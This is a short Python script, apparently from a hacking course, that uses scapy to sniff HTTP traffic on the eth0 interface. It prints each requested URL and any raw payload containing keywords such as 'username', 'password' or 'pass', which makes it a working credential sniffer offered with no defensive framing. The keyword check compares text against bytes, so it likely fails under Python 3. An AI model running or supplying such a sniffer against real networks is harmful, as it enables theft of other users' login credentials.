#!/usr/bin/env python

import scapy.all as scapy
from scapy.all import http

def sniff(interface):
    scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet)#prn=callback function


def process_sniffed_packet(packet): #checks for http data and prints it
    if packet.haslayer(http.HTTPRequest):
        url = packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path
        print(url)

        if packet.haslayer(scapy.Raw):
            load = packet[scapy.Raw].load #scapy.show displays layer information
            keywords = ["log in", "username", "password", "user", "pass"]

            for keywords in keywords:
                if keywords in load:
                    print(load)
                    break

sniff("eth0")
